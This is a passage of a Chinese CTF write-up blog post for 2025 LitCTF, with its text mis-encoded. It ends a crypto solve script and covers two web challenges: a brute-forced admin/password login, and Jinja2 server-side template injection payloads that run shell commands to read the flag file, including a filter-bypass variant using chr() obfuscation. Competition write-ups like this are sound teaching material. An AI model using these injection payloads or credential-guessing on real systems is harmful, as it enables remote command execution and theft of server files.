class="number">328627523443531702430603855075960220403</span>, <span class="number">283995291614222889691668376952473718279</span>, <span class="number">185992200035693404743830210660606140043</span>, <span class="number">175575945935802771832062328390060568381</span>, <span class="number">239709736751531517044198331233711541211</span>, <span class="number">325191992201185112802734343474281930993</span>, <span class="number">285825734319916654888050222626163129503</span>, <span class="number">260820892372814862728958615462018022903</span>, <span class="number">271109638409686342632742230596810197399</span>, <span class="number">195432366301516284662210689868561107229</span>, <span class="number">252351678712166898804432075801905414141</span>, <span class="number">175869608753229067314866329908981554323</span>, <span class="number">212291732707466211705141589249474157597</span>, <span class="number">299891357045144243959903067354676661051</span>, <span class="number">271237385422923460052644584552894282763</span>, <span class="number">268702576849722796315440463412052409241</span>, <span class="number">198273535005705777854651218089804228523</span>, <span class="number">177684355989910045168511400849036259973</span>, <span class="number">189237944200991357454773904466163557789</span>, <span class="number">175427967765368330787115337317676160499</span>, <span class="number">270446056495616077936737430232108222303</span>, <span class="number">243318639972702711024520926308402316247</span>, <span class="number">223872107662231922057872197123261908053</span>, <span class="number">268995355861070998347238198063073079851</span>, <span class="number">244478236168888494353493404999149985963</span>, <span class="number">230731375083676409248450208772518041369</span>, <span class="number">231630208287176700035265642824425872113</span>, <span class="number">187649298194887119502654724235771449423</span>, <span class="number">264924369987111619306245625770849264491</span>, <span class="number">327092811483332202721992798797117253283</span>, <span class="number">274967838920225995524024619709213673571</span>, <span class="number">313836314009366857157961838519499192671</span>, <span class="number">181860768653760352435352944732117309357</span>, <span class="number">184011200837375425882494435177626368109</span>, <span class="number">246455975565763627776562816894916143559</span>, <span class="number">262208917125258935991543552004318662109</span>, <span class="number">334006940602786701813813048552124976177</span>, <span class="number">241119397420390120456580389194328607351</span>, <span class="number">255370083166310325724283692646412327547</span>, <span class="number">280056982387584554076672702548437488901</span>, <span class="number">190822826881447578202544631446213911541</span>, <span class="number">206119293866065537243159766877834200177</span>, <span class="number">289535246575130471484249052043282790337</span>, <span class="number">222004375767927951747133364917437739627</span>, <span class="number">186041951615746748538744491355290007923</span>, <span class="number">299120276948597373232905692530626175519</span>, <span class="number">268645812049699572580085139845553457511</span>, <span class="number">231990902203442306941381714523426756489</span>, <span class="number">259677531562170067444672097354970172129</span>, <span class="number">232573792063456357545735601063504090387</span>, <span class="number">268451806037215206985127877726665463011</span>, <span class="number">324266632324016349795115268035757999593</span>, <span class="number">323952615081869295386415078624753400501</span>, <span class="number">302316593553669781596237136546083536339</span>, <span class="number">235576231941572491681115931798290883659</span>, <span class="number">202271277470197960243533508432663735031</span>, <span class="number">172391954991101354275650988921310984563</span>, <span class="number">215333185856183701105529790905068832303</span>, <span class="number">335916893044781805453250006520700519353</span>, <span class="number">217268288923298532517983372665872329797</span>, <span class="number">265455575922780577837866687874732212733</span>, <span class="number">182194442259001995170676842797322170297</span>, <span class="number">180222796978664332193987060700843734759</span>, <span class="number">332629077640484670095070754759241249101</span>, <span class="number">238815683708676274248277883404136375767</span>, <span class="number">246167709707533867216616011486975023679</span>, <span class="number">188375282015595301232040104228085154549</span>, <span class="number">230675799347049231846866057019582889423</span>, <span class="number">290911573230654740468234181613682439691</span>, <span class="number">173178956820933028868714760884278201561</span>, <span class="number">340087079300305236498945763514358009773</span>, <span class="number">215775253913162994758086261347636015049</span>, <span class="number">286306008278685809877266756697807931889</span>, <span class="number">175231652202310718229276393280541484041</span>, <span class="number">230887015177563361309867021497576716609</span>, <span class="number">306478031708687513424095160106047572447</span>, <span class="number">172289054804425429042492673052057816187</span>]</span><br><span class="line">enc = <span class="number">82516114905258351634653446232397085739</span></span><br><span class="line"></span><br><span class="line">flag = attack(p, pubkey, enc)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br><span class="line"><span class="comment"># LitCTF&#123;Am3xItsT&#125;</span></span><br></pre></td></tr></table></figure>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_81161051/article/details/148230231">https://blog.csdn.net/2301_81161051/article/details/148230231</a>å’Œ<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52640415/article/details/148240141">https://blog.csdn.net/weixin_52640415/article/details/148240141</a></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="nest-js"><a href="#nest-js" class="headerlink" title="nest_js"></a>nest_js</h3><p>è¿™ä¸ªç›´æ¥çˆ†ç ´è´¦å·å¯†ç å³å¯ï¼šadmin/password</p>
<p><img src="1.png" alt="å›¾ç‰‡"></p>
<h3 id="æ˜Ÿæ„¿ä¿¡ç®±"><a href="#æ˜Ÿæ„¿ä¿¡ç®±" class="headerlink" title="æ˜Ÿæ„¿ä¿¡ç®±"></a>æ˜Ÿæ„¿ä¿¡ç®±</h3><p>sstiæ³¨å…¥ï¼Œå‘ç°"{{"è¢«è¿‡æ»¤</p>
<p><img src="2.png" alt="å›¾ç‰‡"></p>
<p>ä½¿ç”¨æ— ç©ºæ ¼çš„payloadæ‰“ä¸€ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span> (cycler.<span class="built_in">next</span>.__globals__.os.popen(<span class="string">&#x27;cat /f*&#x27;</span>)).read()%&#125;</span><br></pre></td></tr></table></figure>
<p><img src="3.png" alt="å›¾ç‰‡"></p>
<p>å‘ç°catå‘½ä»¤è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬æ¢ä¸ª<code>tac</code>æˆ–è€…<code>nl</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span> (cycler.<span class="built_in">next</span>.__globals__.os.popen(<span class="string">&#x27;nl /f*&#x27;</span>)).read()%&#125;</span><br></pre></td></tr></table></figure>
<p><img src="4.png" alt="å›¾ç‰‡"></p>
<p>å½“æ—¶æ‰“çš„æ—¶å€™ï¼Œå‘ç°äº†ä¸€ä¸ªå¾ˆå¼ºçš„payloadï¼Œå¦‚æœæœ‰å¾ˆå¤šè¿‡æ»¤å¯ä»¥ç”¨è¿™ä¸ªpayloadï¼Œä½†ç”¨è¿™ä¸ªæ‹¿åˆ°çš„å´æ˜¯ä¸ªå‡flagï¼Œæ— è¯­äº†ğŸ˜­ğŸ˜­ğŸ˜­</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>).pop(<span class="number">24</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">globals</span>=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=<span class="number">1</span>)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> init=(a,a,<span class="built_in">dict</span>(init=<span class="number">1</span>)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> builtins=(a,a,<span class="built_in">dict</span>(builtins=<span class="number">1</span>)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(lipsum|attr(<span class="built_in">globals</span>)).get(builtins) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=a.<span class="built_in">chr</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">print</span> a.<span class="built_in">open</span>(<span class="built_in">chr</span>(<span class="number">47</span>)~<span class="built_in">chr</span>(<span class="number">102</span>)~<span class="built_in">chr</span>(<span class="number">108</span>)~<span class="built_in">chr</span>(<span class="number">97</span>)~<span class="built_in">chr</span>(<span class="number">103</span>)).read() %&#125;</span><br></pre></td></tr></table></figure>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>æœ¬æ–‡ä½œè€…ï¼š </strong>zh1yu
  </li>
  <li class="post-copyright-link">
    <strong>æœ¬æ–‡é“¾æ¥ï¼š</strong>
    <a href="http://zh1yu.xyz/2025/05/25/2025LitCTF%E9%83%A8%E5%88%86wp/" title="2025LitCTFéƒ¨åˆ†wp">http://zh1yu.xyz/2025/05/25/2025LitCTFéƒ¨åˆ†wp/</a>
  </li>
  <li class="post-copyright-license">
    <strong>ç‰ˆæƒå£°æ˜ï¼š </strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E6%AF%94%E8%B5%9Bwp/" rel="tag"># æ¯”èµ›wp</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2025/05/24/2025%E8%BD%A9%E8%BE%95%E6%9D%AF%E9%83%A8%E5%88%86wp/" rel="prev" title="2025è½©è¾•æ¯éƒ¨åˆ†wp">
      <i class="fa fa-chevron-left"></i> 2025è½©è¾•æ¯éƒ¨åˆ†wp
    </a></div>
      <div class="post-nav-item">
    <a href="/2025/05/30/DC-1%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/" rel="next" title="DC-1é¶æœºå¤ç°">
      DC-1é¶æœºå¤ç° <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">1.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#basic"><span class="nav-number">1.1.</span> <span class="nav-text">basic</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ez-math"><span class="nav-number">1.2.</span> <span class="nav-text">ez_math</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#math"><span class="nav-number">1.3.</span> <span class="nav-text">math</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#baby"><span class="nav-number">1.4.</span> <span class="nav-text">baby</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#leak"><span class="nav-number">1.5.</span> <span class="nav-text">leak</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#new-bag"><span class="nav-number">1.6.</span> <span class="nav-text">new_bag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nest-js"><span class="nav-number">2.1.</span> <span class="nav-text">nest_js</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%98%9F%E6%84%BF%E4%BF%A1%E7%AE%B1"><span class="nav-number">2.2.</span> <span class="nav-text">æ˜Ÿæ„¿ä¿¡ç®±</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="zh1yu"
      src="/images/zh1yu2.jpg">
  <p class="site-author-name" itemprop="name">zh1yu</p>
  <div class="site-description" itemprop="description">èŠ±æœ‰é‡å¼€æ—¥,äººæ— å†å°‘å¹´</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">26</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="/1182418846@qq.com" title="QQ â†’ 1182418846@qq.com"><i class="qq fa-fw"></i>QQ</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class=""></i>
  </span>
  <span class="author" itemprop="copyrightHolder">zh1yu</span>
</div>



        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  


<!-- å¼•å…¥jQuery -->
<script type="text/javascript" src="//libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>

<!-- é›ªèŠ±ç‰¹æ•ˆ -->
<script type="text/javascript" src="/js/snow.js"></script>

</body>
</html>
